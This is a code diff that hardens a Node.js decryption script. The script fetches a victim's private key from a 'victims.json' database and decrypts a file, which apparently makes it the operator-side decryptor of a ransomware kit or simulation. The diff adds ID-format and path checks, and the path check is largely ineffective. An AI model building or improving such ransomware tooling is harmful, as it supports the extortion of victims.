@@ -14,6 +14,17 @@ if (!victimId || !filePath) {
     process.exit(1);
 }
 
+if (!/^V-[A-F0-9]{8}$/.test(victimId)) {
+    console.error("❌ Error: Invalid Victim ID format. Expected V-XXXXXXXX (hex).");
+    process.exit(1);
+}
+
+const resolvedPath = path.resolve(filePath);
+if (resolvedPath.includes('..') || resolvedPath !== path.normalize(resolvedPath)) {
+    console.error("❌ Error: Invalid file path.");
+    process.exit(1);
+}
+
 try {
     // 1. Get Private Key from DB
     const dbPath = path.join(__dirname, 'db', 'victims.json');
@@ -29,11 +40,11 @@ try {
     console.log(`[+] Found private key for victim ${victimId}`);
 
     // 2. Read Encrypted File
-    if (!fs.existsSync(filePath)) {
-        console.error(`❌ Error: File ${filePath} does not exist!`);
+    if (!fs.existsSync(resolvedPath)) {
+        console.error(`❌ Error: File ${resolvedPath} does not exist!`);
         process.exit(1);
     }
-    const encryptedBuffer = fs.readFileSync(filePath);
+    const encryptedBuffer = fs.readFileSync(resolvedPath);
 
     // 3. Parse File Format
     // Format: [WrappedKeyLength (4 bytes, Little Endian)] + [WrappedKey] + [IV (12 bytes)] + [Ciphertext || Tag (16 bytes)]
@@ -71,7 +82,7 @@ try {
     const finalDecrypted = Buffer.concat([decryptedPart1, decryptedPart2]);
 
     // 6. Save Decrypted File
-    const outPath = filePath + '.decrypted';
+    const outPath = resolvedPath + '.decrypted';
     fs.writeFileSync(outPath, finalDecrypted);
     
     console.log(`✅ Success! File decrypted and saved to: ${outPath}`);
